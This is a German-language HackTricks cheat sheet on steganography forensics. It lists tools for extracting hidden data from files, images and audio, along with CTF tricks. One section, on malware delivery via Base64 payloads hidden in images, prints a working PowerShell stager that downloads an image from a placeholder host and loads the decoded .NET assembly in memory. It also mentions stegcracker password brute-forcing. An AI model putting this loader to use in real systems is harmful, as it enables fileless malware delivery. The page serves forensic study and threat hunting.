# Stego-Tricks

{{#include ../banners/hacktricks-training.md}}

## **Daten aus Dateien extrahieren**

### **Binwalk**

Ein Tool zum Durchsuchen binärer Dateien nach eingebetteten, versteckten Dateien und Daten. Es wird über `apt` installiert und der Quellcode ist auf [GitHub](https://github.com/ReFirmLabs/binwalk) verfügbar.
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Stellt Dateien anhand ihrer Header und Footer wieder her, nützlich für png-Bilder. Installierbar über `apt`; Quellcode auf [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Hilft beim Anzeigen von Dateimetadaten, verfügbar [hier](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Ähnlich wie exiftool zum Anzeigen von Metadaten. Installierbar über `apt`, Quellcode auf [GitHub](https://github.com/Exiv2/exiv2), und hat eine [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Bestimme den Dateityp, mit dem du es zu tun hast.

### **Strings**

Extrahiert lesbare Strings aus Dateien und verwendet verschiedene Encoding-Einstellungen, um die Ausgabe zu filtern.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Nützlich zum Vergleichen einer modifizierten Datei mit ihrer Originalversion, die online gefunden wurde.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Versteckte Daten aus Text extrahieren**

### **Versteckte Daten in Leerzeichen**

Unsichtbare Zeichen in scheinbar leeren Bereichen können Informationen verbergen. Um diese Daten zu extrahieren, besuchen Sie [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Daten aus Bildern extrahieren**

### **Bilddetails mit GraphicMagick identifizieren**

[GraphicMagick](https://imagemagick.org/script/download.php) dient dazu, Bilddateitypen zu bestimmen und mögliche Beschädigungen zu erkennen. Führen Sie den folgenden Befehl aus, um ein Bild zu untersuchen:
```bash
./magick identify -verbose stego.jpg
```
Um ein beschädigtes Bild zu reparieren, kann das Hinzufügen eines Metadatenkommentars helfen:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide zur Datenverbergung**

Steghide ermöglicht das Verstecken von Daten in `JPEG, BMP, WAV, and AU`-Dateien und kann verschlüsselte Daten einbetten und extrahieren. Die Installation erfolgt einfach über `apt`, und der [Quellcode ist auf GitHub verfügbar](https://github.com/StefanoDeVuono/steghide).

**Befehle:**

- `steghide info file` zeigt an, ob eine Datei versteckte Daten enthält.
- `steghide extract -sf file [--passphrase password]` extrahiert die versteckten Daten; Passwort optional.

Für webbasierte Extraktion besuche [diese Website](https://futureboy.us/stegano/decinput.html).

**Bruteforce-Angriff mit Stegcracker:**

- Um einen Passwort-Angriff auf Steghide zu versuchen, verwende [stegcracker](https://github.com/Paradoxis/StegCracker.git) wie folgt:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg für PNG- und BMP-Dateien**

zsteg ist auf das Aufdecken versteckter Daten in PNG- und BMP-Dateien spezialisiert. Die Installation erfolgt über `gem install zsteg`, mit dem [Quellcode auf GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` wendet alle Erkennungsmethoden auf eine Datei an.
- `zsteg -E file` gibt eine Payload für die Datenextraktion an.

### **StegoVeritas und Stegsolve**

**stegoVeritas** prüft Metadaten, führt Bildtransformationen durch und wendet unter anderem LSB brute forcing an. Verwende `stegoveritas.py -h` für eine vollständige Liste der Optionen und `stegoveritas.py stego.jpg`, um alle Prüfungen auszuführen.

**Stegsolve** wendet verschiedene Farbfilter an, um versteckte Texte oder Nachrichten in Bildern sichtbar zu machen. Es ist verfügbar auf [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT zur Erkennung verborgener Inhalte**

Fast Fourier Transform (FFT)-Techniken können verdeckte Inhalte in Bildern aufdecken. Nützliche Ressourcen sind:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy für Audio- und Bilddateien**

Stegpy ermöglicht das Einbetten von Informationen in Bild- und Audiodateien und unterstützt Formate wie PNG, BMP, GIF, WebP und WAV. Es ist verfügbar auf [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck für die Analyse von PNG-Dateien**

Zur Analyse von PNG-Dateien oder zur Überprüfung ihrer Authentizität, verwende:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Zusätzliche Tools zur Bildanalyse**

Zur weiteren Recherche besuchen Sie:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Mit Markern begrenzte Base64 payloads, die in Bildern verborgen sind (malware delivery)

Commodity loaders verstecken zunehmend Base64-encodete payloads als Klartext in ansonsten gültigen Bildern (oft GIF/PNG). Anstatt auf Pixel-Ebene via LSB platzierte Daten, wird die payload durch eindeutige Start-/End-Marker-Strings begrenzt, die in den Text-/Metadaten der Datei eingebettet sind. Ein PowerShell stager führt dann aus:
- Lädt das Bild über HTTP(S) herunter
- Findet die Marker-Strings (beobachtete Beispiele: <<sudo_png>> … <<sudo_odt>>)
- Extrahiert den dazwischenliegenden Text und Base64-dekodiert ihn zu Bytes
- Lädt die .NET-Assembly in den Speicher und ruft eine bekannte Einstiegsmethode auf (keine Datei wird auf die Festplatte geschrieben)

Minimales PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Hinweise
- Dies fällt unter ATT&CK T1027.003 (steganography). Marker-Strings variieren zwischen Kampagnen.
- Hunting: scanne heruntergeladene Bilder nach bekannten Delimitern; kennzeichne `PowerShell`, das `DownloadString` gefolgt von `FromBase64String` verwendet.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Extrahieren von Daten aus Audios**

**Audio steganography** bietet eine einzigartige Methode, Informationen in Audiodateien zu verbergen. Verschiedene Tools werden zum Einbetten oder Wiederherstellen versteckter Inhalte verwendet.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide ist ein vielseitiges Tool zum Verstecken von Daten in JPEG-, BMP-, WAV- und AU-Dateien. Detaillierte Anleitungen finden sich in der [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Dieses Tool ist mit verschiedenen Formaten kompatibel, darunter PNG, BMP, GIF, WebP und WAV. Für weitere Informationen siehe [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg ist entscheidend, um die Integrität von Audiodateien zu prüfen, detaillierte Informationen anzuzeigen und etwaige Unstimmigkeiten zu identifizieren.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg eignet sich hervorragend zum Verbergen und Extrahieren von Daten in WAV-Dateien unter Verwendung der least significant bit-Strategie. Es ist auf [GitHub](https://github.com/ragibson/Steganography#WavSteg) verfügbar. Befehle umfassen:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound ermöglicht die Verschlüsselung und das Auffinden von Informationen in Audio-Dateien mittels AES-256. Es kann von [the official page](http://jpinsoft.net/deepsound/download.aspx) heruntergeladen werden.

### **Sonic Visualizer**

Ein unverzichtbares Werkzeug zur visuellen und analytischen Untersuchung von Audiodateien; Sonic Visualizer kann versteckte Elemente offenbaren, die auf anderem Wege nicht erkennbar sind. Besuchen Sie die [official website](https://www.sonicvisualiser.org/) für weitere Informationen.

### **DTMF Tones - Dial Tones**

Die Erkennung von DTMF-Tönen in Audiodateien kann mit Online-Tools wie [this DTMF detector](https://unframework.github.io/dtmf-detect/) und [DialABC](http://dialabc.com/sound/detect/index.html) durchgeführt werden.

## **Andere Techniken**

### **Binary Length SQRT - QR Code**

Binärdaten, deren Länge eine perfekte Quadratzahl ist, könnten einen QR-Code darstellen. Verwenden Sie dieses Snippet, um es zu prüfen:
```python
import math
math.sqrt(2500) #50
```
Für die Umwandlung von Binärdaten in Bilder siehe [dcode](https://www.dcode.fr/binary-image). Zum Lesen von QR-Codes verwende [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Braille-Übersetzung**

Zur Übersetzung von Braille ist der [Branah Braille Translator](https://www.branah.com/braille-translator) eine ausgezeichnete Ressource.

## **Quellen**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
